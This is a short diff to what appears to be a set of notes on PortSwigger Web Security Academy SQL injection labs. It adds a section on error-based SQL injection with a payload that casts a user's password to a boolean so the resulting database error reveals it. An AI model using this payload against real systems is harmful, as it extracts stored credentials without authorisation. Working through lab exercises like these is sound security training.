@@ -157,6 +157,14 @@ for j in range(1,21):
             break
 ```
 
+### Lab: Visible error-based SQL injection
+
+    https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based
+
+Payload:
+
+    ' AND CAST((SELECT password from users LIMIT 1) AS bool)--
+
 ### Lab: Blind SQL injection with time delays
 
     https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
